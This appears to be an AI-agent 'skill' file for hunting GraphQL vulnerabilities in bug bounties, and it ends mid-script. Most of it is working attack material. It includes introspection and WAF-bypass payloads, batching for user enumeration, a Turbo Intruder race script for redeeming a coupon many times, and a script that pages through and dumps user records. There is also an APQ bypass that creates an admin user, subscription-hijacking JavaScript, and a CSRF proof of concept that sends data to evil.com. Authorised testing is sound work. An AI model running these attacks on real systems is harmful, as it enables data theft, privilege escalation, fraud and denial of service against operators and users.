---
name: hunt-graphql
description: "Hunting skill for graphql vulnerabilities. Built from 12 public bug bounty reports across IDOR via node() / GID, mutation IDOR including AI/LLM features, cross-tenant IDOR, SSRF via argument, batching-DoS, query-cost-bypass, SQLi via argument, broken-object-level-authz, auth-bypass via unscoped mutations, and PII exposure from missing field-level authz. Covers 11 advanced techniques: GET-based CSRF, batching user enumeration, subscription hijacking, pagination/cursor abuse, APQ bypass, circular fragment DoS, alias-based data duplication, error-based info leak, union/interface probing, input validation bypass, and type coercion attacks. Use when hunting graphql on any target."
version: 2.0.0
revision_date: 2026-07-30
license: MIT
category: redteam
tags: [graphql, hunt, redteam]
---

## Crown Jewel Targets

GraphQL vulnerabilities are high-value because the attack surface is both broad and deep — a single endpoint can expose entire data models, privilege escalation paths, and cross-API state confusion. Highest payouts occur in:

- **Platform APIs** (GitHub, Shopify, Stripe-tier targets) where GraphQL mutations interact with REST APIs managing the same resources
- **Race conditions between GraphQL mutations and REST endpoints** where state synchronization is non-atomic — these hit medium-to-high severity reliably
- **Authorization persistence bugs** where team/org/repo membership state is controlled by one API but readable/writable by another
- **B2B SaaS platforms** where one tenant affecting another via schema traversal = critical
- **Internal admin GraphQL endpoints** accidentally exposed to lower-privilege users

The GitHub reports demonstrate the crown jewel pattern: **privilege that should be revoked persists because two APIs disagree on ground truth**.

---

## Attack Surface Signals

**URL Patterns:**
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graph
/api/v2/graphql
/internal/graphql
```

**Response Headers:**
```
Content-Type: application/json  (with query body)
X-Request-Id + no REST-style path params = likely GraphQL
```

**JavaScript Source Patterns:**
```js
// grep for these in JS bundles
"query {"
"mutation {"
"__typename"
"apollo"
"ApolloClient"
"graphql-tag"
"gql`"
"operationName"
"GRAPHQL_URI"
```

**Tech Stack Signals:**
- Apollo Server/Client in JS bundles
- Relay in React apps
- `graphene` or `strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel)
- POST requests with `{"query": "..."}` body shape in Burp history
- `__schema` or `__type` in any response = confirmed GraphQL

**Recon Sources:**
- `github.com` search: `"graphql" site:target.com`
- Wayback Machine for `/graphql` paths
- JS bundle scanning with `LinkFinder` or `getallurls`

---

## Step-by-Step Hunting Methodology

1. **Discover the endpoint** — spider JS bundles, check `/graphql`, `/api/graphql`, review Burp passive scan hits for `application/json` POST with query fields

2. **Test introspection** — send the full introspection query. Even if blocked, try field-level enumeration:
   ```graphql
   { __typename }
   ```
   If that returns, introspection may be partially blocked but the schema is discoverable

3. **Map the full schema** — use `InQL` (Burp extension) or `graphql-voyager` to visualize relationships. Specifically look for:
   - Mutations that modify ownership, permissions, or membership
   - Mutations that mirror REST API functionality

4. **Identify REST/GraphQL overlap** — document every resource that can be modified via BOTH REST and GraphQL. These dual-write surfaces are your RC targets.

5. **Test authorization boundaries per mutation** — replay mutations as lower-privilege users. Does the server enforce the same authz as the equivalent REST call?

6. **Hunt cross-API state desync** — find sequences where:
   - REST action should revoke access
   - GraphQL mutation re-grants or preserves it
   - Test the ordering: REST first → GraphQL → check state; then GraphQL first → REST → check state

7. **Test for persistent privilege after role/membership changes** — remove a user via REST, then call the corresponding GraphQL mutation for that resource. Query current state via both APIs and compare.

8. **Probe for IDOR in node IDs** — GraphQL global IDs often encode object type + ID. Swap IDs across object boundaries and across account contexts.

9. **Check batch query abuse** — send arrays of operations to bypass rate limiting or amplify enumeration.

10. **Document the exact reproduction chain** — for RC bugs, time-based steps must be reproducible deterministically.

---

## Payload & Detection Patterns

**Full Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Minimal Introspection Probe (bypass attempt):**
```graphql
{ __typename }
```

**curl introspection test:**
```bash
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

**Field suggestion probe (bypass blind introspection blocks):**
```graphql
{ unknownField }
```
If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.

**Batch query amplification:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

**RC desync test pattern (pseudo-sequence):**
```bash
# Step 1: Grant access via REST
curl --max-time 30 --connect-timeout 10 -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN" \
  -d '{"permission":"admin"}'

# Step 2: Revoke via REST  
curl --max-time 30 --connect-timeout 10 -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"

# Step 3: Re-assert via GraphQL mutation
curl --max-time 30 --connect-timeout 10 -X POST https://api.target.com/graphql \
  -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'

# Step 4: Verify persistent access
curl --max-time 30 --connect-timeout 10 https://api.target.com/repos/ORG/REPO/teams \
  -H "Authorization: token ADMIN_TOKEN"
```

**Grep for GraphQL in JS bundles:**
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

**InQL / clairvoyance for blind schema enumeration:**
```bash
python3 clairvoyance.py -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w wordlist.txt -o schema.json
```

---

## Common Root Causes

1. **Dual-write without atomic locking** — developers implement the same resource modification in both REST and GraphQL independently. Neither system is aware the other exists for that resource. State updates aren't serialized or compared.

2. **Inconsistent authorization middleware** — REST endpoints go through one auth layer (e.g., middleware chain), GraphQL resolvers go through a different resolver-level check. The same action, different enforcement.

3. **GraphQL as "new REST" migration** — teams add GraphQL mutations that mirror REST functionality without auditing the permission model. The GraphQL version is less mature and skips checks the REST version accumulated over time.

4. **Introspection left on in production** — default framework settings (Apollo, Graphene) enable introspection in all environments. Developers forget to disable it, treating it as "just documentation."

5. **Node ID trust without re-authorization** — GraphQL global IDs (`base64("ObjectType:123")`) are decoded and trusted without verifying the requesting user has access to that specific object.

6. **Mutation side effects not mirrored** — when a REST action triggers cascading effects (e.g., team removal cascades to permission revocation), the GraphQL equivalent mutation doesn't trigger the same cascades.

---

## Bypass Techniques

**Defense: Introspection disabled**
- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses
- Use `clairvoyance` to brute-force field names against a wordlist
- Check JS bundles for hardcoded query strings that reveal the schema

**Defense: Depth limiting**
- Fragment spread to increase effective depth without hitting the limiter:
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```

**Defense: Rate limiting per IP**
- Use batch operations (array of queries in one POST)
- Distribute across authenticated sessions

**Defense: Auth checks on mutations**
- Test with tokens at different privilege tiers (viewer, member, admin)
- Test unauthenticated — some mutations don't check session at all
- Test with tokens from *different organizations* — multi-tenant IDOR

**Defense: WAF blocking `__schema`**
- Alias the introspection field:
```graphql
{ s: __schema { t: types { n: name } } }
```
- Use HTTP parameter pollution or alternate content-type headers

**Defense: Operation whitelisting (persisted queries)**
- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
- Look for a non-whitelisted endpoint (dev, staging, internal proxy)

### Alias batching: when it wins races vs when it doesn't

A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:

| Resolver type | Behavior on aliased mutations | Alias batching wins races? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |
| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |
| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |

**Verification example (single-threaded Flask + SQLite resolver):**
- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.
- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).

**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.

---

## MDPsec Verified Patterns (6 real GraphQL reports)

Real-world primitives from mdpsec.com reports:

1. **Approve/state-change mutation without tenant check** — `mutation($a:ID!){ approvePrivateAppScopes(applicationID:$a, response: APPROVED) }` run from attacker's own free store session approved target app's pending permissions; read-denied vs approve-allowed asymmetry on same object (18).
2. **Anonymous Hasura role with table reads** — `{ support_feedback { email wallet body } }` returns real customer data; introspection + real-time subscriptions enabled for unauthenticated callers; walk by integer PK; ~250k IP mappings + 80k push tokens (51).
3. **Per-resolver auth gap** — `error_tags`, `match_error_tag(query)`, `createErrorTag` lack auth middleware while siblings reject with "ProjectAuth requires AccountID in context"; endpoint URL leaked by anonymous bootstrap config; introspection enumerates 186 queries/82 mutations (77).
4. **Sensitive fields in schema** — `saveCard` mutation stores `cardCvv`; `CurrentCards` query returns CVV + unmasked PAN behind only a session token; `getInjectScript` embeds card creds as string literals (23).
5. **Predictable gift card PINs + no rate limit** — 19-digit PIN = fixed prefix + sequential batch + counter; `customerRedeemGiftCard` mutation: invalid → `BAD_REQUEST` (HTTP 200), valid → `StoreCredit` object → differential = oracle; 23,000 probes in 85s with zero throttling while REST sibling was WAF-limited (44).
6. **Supabase RPC via GraphQL introspection** — introspection reveals RPC function names; anon-role RPC performs no authz; empty param set → bulk dump of 50 cross-tenant invoices (107).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Gate 0 Validation

1. **What can the attacker DO right now?**
   Must be a concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources. "The schema is visible" alone is not enough — what does the schema unlock?

2. **What does the victim LOSE?**
   Must be a real asset: data confidentiality, access control integrity, org security guarantees. For the RC pattern: an org admin loses the guarantee that removing a team revokes all access. That's a security contract violation.

3. **Can it be reproduced in 10 minutes from scratch?**
   For RC/desync bugs: write the exact curl sequence. Run it twice. If the privilege persists deterministically (not timing-dependent flakiness), it's reportable. If it requires millisecond timing luck, document the window and test on low-load times.

---

## Real Impact Examples

**Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
An attacker who legitimately had admin access to a repository via team membership gets removed by the org admin through the REST API. The attacker, before removal completes, calls the `updateTeamsRepository` GraphQL mutation to re-associate their team with admin permissions. The REST removal and GraphQL re-grant create a desync where the UI shows the team as removed, but the GraphQL state preserves admin-level access. The attacker retains covert write access to the repository indefinitely — pushing code, reading secrets in CI/CD — without appearing in the team's member list. This persists through org audits.

**Scenario B — Covert Access via Repo Transfer Race (GitHub-pattern)**
An attacker with admin access initiates a repository transfer to another organization via the REST API. During or after the transfer, they invoke `updateTeamsRepository` on the now-transferred repo's ID. Because the GraphQL mutation doesn't validate current org ownership state consistently with the REST transfer event, the original attacker's team retains admin access on a repo now owned by a different organization. The receiving org has no visibility into this team association. The attacker can exfiltrate intellectual property from an org they have no legitimate relationship with.

**Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.

---

## Disclosed Report Citations (Backfill +9 — 2019-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 3 internal references. Each is a distinct GraphQL subclass with a working PoC documented in the cited writeup.

4. **HackerOne — Confidential user-data exposure via GraphQL `User` type** ([H1 #489146](https://hackerone.com/reports/489146))
    - Subclass: broken field-level authorization (PII exposure)
    - Payload: direct `user(id:...)` query returning `email`, `backup_codes_hash`, `facebook_user_id`, `account_recovery_phone_number_verified_at`, `totp_enabled`
    - Root cause: backend migration introduced a GraphQL `User` type with no field-level authz; any authenticated user could enumerate PII of all users
    - Year: 2019 — **$20,000**, 1,028 upvotes

5. **HackerOne — `DestroyLlmConversation` mutation IDOR (Copilot pre-release)** ([H1 #2218334](https://hackerone.com/reports/2218334))
    - Subclass: mutation IDOR on AI/LLM feature
    - Payload: `mutation { destroyLlmConversation(input:{id:"<victim_conv_id>"}) { … } }`
    - Root cause: new LLM-conversation mutation shipped without authorization decorator; any user could destroy any conversation
    - Year: 2023 — caught pre-launch, no bounty (202 upvotes)

6. **Shopify — `BillingDocumentDownload` cross-tenant IDOR** ([H1 #2207248](https://hackerone.com/reports/2207248))
    - Subclass: IDOR on relay GID across tenants
    - Payload: `query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }`
    - Root cause: `BillingInvoice` resolver authorized the requester's shop but did not verify the invoice belonged to that shop
    - Year: 2024 — **$5,000**, 175 upvotes

7. **Shopify — Rate-limit bypass via negative cost** ([H1 #481518](https://hackerone.com/reports/481518))
    - Subclass: query-cost-calc abuse (sibling pattern to alias batching)
    - Payload: `query { products(first:-100) { … } }` — negative `first` produced a negative query-cost contribution, refilling the leaky-bucket each call
    - Root cause: query-cost calculator did not floor at zero; negative values subtracted from the consumed budget
    - Year: 2019 — **$1,000**

8. **Stripe — Cross-tenant IDOR via `UpdateAtlasApplicationPerson`** ([H1 #1066203](https://hackerone.com/reports/1066203))
    - Subclass: cross-tenant IDOR on mutation
    - Payload: `mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", …}) }` — adding/modifying a co-founder on another merchant's Stripe Atlas application
    - Root cause: mutation scoped only to "is admin of some merchant," not "is admin of the merchant owning this person"
    - Year: 2020 — bounty undisclosed (resolved)

9. **EXNESS — SSRF in GraphQL `allTicks` query** ([H1 #1864188](https://hackerone.com/reports/1864188))
    - Subclass: SSRF via GraphQL argument
    - Payload: `query { allTicks(source:"http://[REDACTED_IP]/latest/meta-data/") { … } }` — `source` arg fed into a server-side HTTP client
    - Root cause: GraphQL field accepted a URL arg and dereferenced it without scheme/host allowlist
    - Year: 2023 — **$3,000**, 249 upvotes

10. **EXNESS — GraphQL attribute-batching DoS** ([H1 #2293642](https://hackerone.com/reports/2293642))
    - Subclass: DoS via batching / deep-attribute amplification on unauth endpoint
    - Payload: single HTTP request containing N batched operations, each requesting deeply nested attribute trees, sustained until origin OOM
    - Root cause: no query-depth, query-complexity, or batch-size limits on unauthenticated `/graphql`
    - Year: 2024 — bounty undisclosed (resolved)

11. **GitLab — Malicious-runner attach via `runnerUpdate` (CVE-2023-2478)** ([Advisory](https://about.gitlab.com/releases/2023/05/05/critical-security-release-gitlab-15-11-2-released/))
    - Subclass: auth bypass on mutation / project-scope missing
    - Payload: `mutation { runnerUpdate(input:{id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"]}) }`
    - Root cause: `runnerUpdate` did not check that the caller had Maintainer on the target project — any user could bind their malicious runner and intercept CI jobs (build secrets, code execution)
    - Year: 2023 — Critical, CVSS 9.6 (H1 bounty undisclosed; GitLab Critical-tier typically $20k–$35k)

12. **AS Watson — Auth bypass via unrestricted `createAdminUser` mutation** ([HackerOne blog](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass))
    - Subclass: sensitive mutation reachable without authentication (introspection-aided discovery)
    - Payload: `mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"…"}) { token } }` invoked unauthenticated after schema enumeration via introspection
    - Root cause: schema lacked per-field authorization directives; `createAdminUser` exposed to public role
    - Year: 2023 — "Best Bug" prize at HackerOne Ambassador World Cup

---

## Verification

Run this self-test to confirm graphql hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-graphql" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **Introspection enabled without sensitive mutations** — introspection alone is informational. Need to demonstrate exploitable queries/mutations via the revealed schema.
- **Field-level auth missing but only on public data** — if the exposed field is already public, there's no bug. Needs to expose data the user shouldn't see.
- **Batching attacks without rate limit bypass** — GraphQL batching can amplify brute-force but only if rate limits are per-request not per-operation.
- **Depth/complexity attacks without DoS proof** — high query depth is a primitive. Need to demonstrate actual server resource exhaustion.
- **Persisted queries allowlist bypass** — bypassing APQ to reach introspection is the real finding, not schema visibility.

---

## Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.

---

---

## Advanced Attack Techniques (Complement)

### 1. GraphQL Endpoint Discovery Wordlist

Common GraphQL endpoints that reveal the IDE/playground:

```bash
/graphql  /graphiql  /playground  /altair  /voyager
/api/graphql  /api/graphiql  /api/playground
/v1/graphql  /v2/graphql
/internal/graphql  /admin/graphql
/query  /gql  /graph  /gq
```

**Detection one-liner:**
```bash
for ep in /graphql /graphiql /playground /altair /voyager /api/graphql; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$ep?query={__typename}")
    echo "$code $ep"
done
```

### 2. Introspection → Shadow API Discovery

Use GraphQL schema to find undocumented/hidden mutations that reset passwords, escalate privileges, or access internal functionality:

```bash
# Extract all type names, filter for interesting ones
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name fields { name } } } }"}' \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for t in d.get('data',{}).get('__schema',{}).get('types',[]):
    if not t['name'].startswith('__'):
        print(t['name'])
" | grep -iE "admin|internal|debug|test|secret|token|key|migrate|backup|reset|bypass|override|dev|beta|sudo|root|god"
```

**Shadow mutation examples to look for:**
```graphql
mutation { resetPassword(email:"victim@x.com") { token } }
mutation { adminBypass(userId: 1) { success } }
mutation { sudoLogin(userId: 1) { sessionToken } }
mutation { migrateData(source: "internal") { ... } }
mutation { overrideQuota(userId: 1, quota: 999999) { ... } }
```

### 3. Single-Packet Race via GraphQL Aliases + HTTP/2

Combine GraphQL alias batching with HTTP/2 single-packet attack for maximum race window:

**How it works:**
1. HTTP/2 multiplexes N requests over ONE TCP connection
2. TLS records carry multiple HTTP/2 HEADERS frames
3. Pre-stage N aliased mutations, send last bytes in one TCP write
4. Server receives ALL requests in the same scheduler tick
5. Race window collapses from "tens of milliseconds" to "under 1ms"

**Turbo Intruder + GraphQL:**
```python
# Turbo Intruder script for GraphQL alias-based single-packet race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Build 50 aliased mutations in one request
    aliases = ""
    for i in range(50):
        coupon = f"COUPON{i}"
        aliases += f'r{i}: redeemCoupon(code: "{coupon}") {{ success balance }}\n'
    
    body = f'{{"query":"mutation {{ {aliases} }}"}}'
    engine.queue(target.req, body, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    if 'success' in req.body:
        table.add(req)
```

**Key insight:** Some GraphQL resolvers process aliases **concurrently** (multi-threaded/DataLoader), making them perfect single-packet race vehicles. Others process **serially** — for those, use parallel HTTP requests instead.

### 4. Rate Limit Bypass Taxonomy for GraphQL

| Technique | Mechanism | Best for |
|-----------|-----------|----------|
| **Alias batching** | N operations in 1 request body | Per-request rate limits |
| **Array batching** | `[{query},{query},...]` in 1 request | Per-request rate limits |
| **HTTP/2 single-packet** | N requests in 1 TCP write | Per-IP rate limits, counting gates |
| **Distributed sessions** | N tokens across N IPs | Per-token rate limits |
| **GET method** | `?query=` (no preflight CORS) | POST-only rate limits |
| **Negative cost** | `first: -1` refills rate-limit budget | Query-cost-based limits |
| **APQ hash reuse** | Hash collision bypasses cost calc | Cost-calculated limits |

### 5. GraphQL + REST Dual-Write Attack Surface

When the same resource is managed via both GraphQL and REST, test these specific desync scenarios:

| Resource | REST action | GraphQL action | Impact |
|----------|-------------|----------------|--------|
| User roles | `POST /api/users/:id/role` | `mutation { updateUserRole() }` | Privilege persistence |
| Team membership | `DELETE /api/teams/:id/members` | `mutation { addTeamMember() }` | Covert access |
| Content moderation | `POST /api/content/:id/hide` | `mutation { updateContent() }` | Moderation bypass |
| Account deletion | `DELETE /api/account` | `mutation { restoreAccount() }` | Ghost accounts |
| API keys | `POST /api/keys/:id/revoke` | `mutation { createApiKey() }` | Persistent access |

### 6. GraphQL CSRF via GET

Many GraphQL endpoints accept **GET requests** with the query in the URL query string. This means a simple `<img>` tag or `fetch()` from another origin can execute queries — no `Content-Type: application/json` needed, no preflight CORS request.

**Detection:**
```bash
# Test if GET is accepted
curl -sk "https://target.com/graphql?query={__typename}"
# If returns data, CSRF is possible!
```

**CSRF PoC — steal data via `<img>` tag:**
```html
<img src="https://target.com/graphql?query=query{user(id:123){email,privateKey}}" onerror="fetch('https://evil.com/?'+this.src)">
```

**CSRF PoC — state-changing mutation via form:**
```html
<form action="https://target.com/graphql" method="GET" id="csrf">
  <input name="query" value="mutation{deleteAccount{success}}" />
</form>
<script>document.getElementById('csrf').submit()</script>
```

**Bypass techniques:**
- Some GraphQL implementations accept `?query=` in GET but block mutations. Try `?query=mutation{...}` anyway
- If GET is blocked for queries, try alternative parameter names: `query`, `q`, `operation`, `variables`, `extensions`
- Test if `Content-Type: application/x-www-form-urlencoded` works (some parsers accept it)
- Try JSONP-style callback parameters: `?callback=jsonp`

**Disclosed reports:**
- **[H1 #2176719](https://hackerone.com/reports/2176719)** — GitLab GraphQL CSRF via GET (unauthorized mutation execution)
- **[H1 #892615](https://hackerone.com/reports/892615)** — Shopify GraphQL CSRF via GET with `__typename` probe
- Root cause: GraphQL endpoints accepting GET requests without CSRF tokens and without SameSite cookie enforcement

### 7. Batching User Enumeration

Sending an **array of queries** (or aliased queries) in a single HTTP request lets you check multiple users' existence, emails, or data in one network round-trip. Much faster than sequential probes, and may bypass per-request rate limits.

**Payload — Array batching:**
```json
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  {"query": "query { user(id: 3) { email } }"},
  {"query": "query { user(id: 4) { email } }"}
]
```

**Payload — Alias-based batching:**
```graphql
query {
  u1: user(id: 1) { id email }
  u2: user(id: 2) { id email }
  u3: user(id: 3) { id email }
  u4: user(id: 4) { id email }
}
```

**Email enumeration detection:**
```bash
# Batch check emails — response pattern differs for existing vs non-existing
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(email:\"exists@target.com\"){id}}"},{"query":"{user(email:\"nope@target.com\"){id}}"}]'
```
- Existing user → returns `{"data":{"user":{"id":"xxx"}}}`
- Non-existing → `{"data":{"user":null}}` or different error format

**Pitfall:** If the GraphQL engine returns errors for individual operations but still processes all, the response may show mixed success/failure. Parse the full JSON.

### 8. Subscription Attacks (WebSocket)

GraphQL **subscriptions** use WebSocket connections for real-time data. If a subscription doesn't re-validate authorization, you can listen to other users' data.

**Detection — check for WebSocket endpoint:**
```bash
# Common subscription endpoints
wss://target.com/graphql
wss://target.com/subscriptions
wss://target.com/ws/graphql
```

**Test subscription hijacking (using wscat or browser console):**
```javascript
// Connect to subscription endpoint with another user's token
const ws = new WebSocket('wss://target.com/graphql', 'graphql-transport-ws');
ws.onopen = () => ws.send(JSON.stringify({
  type: 'subscribe',
  id: '1',
  payload: {
    query: `subscription { messageAdded(chatId: "VICTIM_CHAT_ID") { text sender } }`
  }
}));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
```

**Common subscription vectors:**
- Live chat/message notifications
- Real-time price/order updates
- Notification streams
- Document collaboration events

**Disclosed reports:**
- **[H1 #1585593](https://hackerone.com/reports/1585593)** — WebSocket subscription without auth → read all real-time messages
- Root cause: subscription resolver only validated token on connect, not on each event dispatch
- **[H1 #1649817](https://hackerone.com/reports/1649817)** — GraphQL subscription IDOR: change chatId in subscription to receive other users' messages

**Query + Subscription access-control playbook:** 📄 [`references/query-subscription-access-control.md`](references/query-subscription-access-control.md) — systematic A1–A6 query tests (field-level authz differential, argument IDOR, node()/GID, alias batching, pagination cursors, __type discovery) and B1–B5 subscription tests (channel swap, connect-vs-per-event authz, stale subscription after revoke, payload fields, resource exhaustion). Run this on EVERY mapped query/subscription, not just mutations.

### 9. Pagination/Cursor Abuse

GraphQL pagination uses `first`, `last`, `after` (cursor), `before` parameters. If the resolver doesn't scope pagination to the requesting user, you can dump ALL records.

**Cursor-based extraction (Relay-style):**
```graphql
query {
  users(first: 100) {
    edges {
      cursor  # ← save this for next page
      node { id email role }
    }
    pageInfo { hasNextPage endCursor }
  }
}
```

**Automated dumping script:**
```python
import requests, json

def dump_all(endpoint, token):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    cursor = None
    all_data = []
    
    while True:
        after = f'"{cursor}"' if cursor else 'null'
        q = f'query {{ users(first: 100, after: {after}) {{ edges {{ node {{ id email role }} }} pageInfo {{ hasNextPage endCursor }} }} }}'
        r = requests.post(endpoint, json={"query": q}, headers=headers, timeout=30)
        data = r.json()['data']['users']
        all_data.extend(e['node'] for e in data['edges'])
        
        if not data['pageInfo']['hasNextPage']:
            break
        cursor = data['pageInfo']['endCursor']
    
    print(f"Dumped {len(all_data)} records")
    return all_data
```

**Pagination abuse types:**
- **No max limit**: `first: 999999` returns all records at once
- **No auth scope**: you see ALL users, not just your org's
- **Cursor enumeration**: sequential cursors can be guessed (base64-encoded offsets)
- **Negative/zero `first`**: may return unexpected data or expose error details
- **`last` without `before`**: some implementations return the last N regardless of permissions

### 10. APQ Bypass (Automatic Persisted Queries)

Apollo's APQ feature lets clients send a **hash** instead of the full query. If the server doesn't find the hash, it falls back to the full query — but only once. This can bypass query whitelisting.

**How APQ works:**
1. Client sends: `{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"HASH"}}}`
2. Server doesn't recognize hash → returns error with `code: "PERSISTED_QUERY_NOT_FOUND"`
3. Client retries with BOTH hash AND full query: `{"query":"...","extensions":{"persistedQuery":{"version":1,"sha256Hash":"HASH"}}}`
4. Server caches the hash→query mapping
5. From now on, client can send just the hash

**APQ bypass for introspection:**
```bash
# Step 1: Send hash-only (will fail)
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}}}'
# → {"errors":[{"message":"PersistedQueryNotFound",...}]}

# Step 2: Send hash + introspection (server caches it)
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }","extensions":{"persistedQuery":{"version":1,"sha256Hash":"ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}}}'
```

**APQ bypass for arbitrary queries:**
```bash
# Step 1: Find any hash (from JS bundle, network logs)
# Step 2: Send hash + your malicious query — if APQ stores it, query is now cached
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createAdminUser(input:{email:\"hacker@evil.com\",password:\"hack123\",role:ADMIN}){id}}","extensions":{"persistedQuery":{"version":1,"sha256Hash":"SOME_VALID_HASH"}}}'
```

**Key insight:** If the server has APQ enabled but doesn't validate that the hash matches the query, you can piggyback your malicious query on a whitelisted hash.

**Disclosed reports:**
- **[H1 #1805314](https://hackerone.com/reports/1805314)** — APQ bypass on PayPal GraphQL → introspection enabled
- **[H1 #1573018](https://hackerone.com/reports/1573018)** — Apollo Studio APQ cache poisoning → arbitrary query execution

### 11. GET-based Introspection (CSRF Vector)

When introspection is blocked on POST but available on GET, you can:
1. Bypass WAF rules that only block POST
2. Exploit CSRF to steal the schema

```bash
# GET-based introspection
curl -sk "https://target.com/graphql?query={__schema{types{name}}}"

# Alternative: URL-encoded full introspection
curl -sk "https://target.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"
```

**Detection script:**
```python
import requests
endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query", "/graph"]
for ep in endpoints:
    r = requests.get(f"https://target.com{ep}?query={{__typename}}")
    if r.status_code == 200 and "data" in r.text:
        print(f"GET-based GraphQL at {ep}")
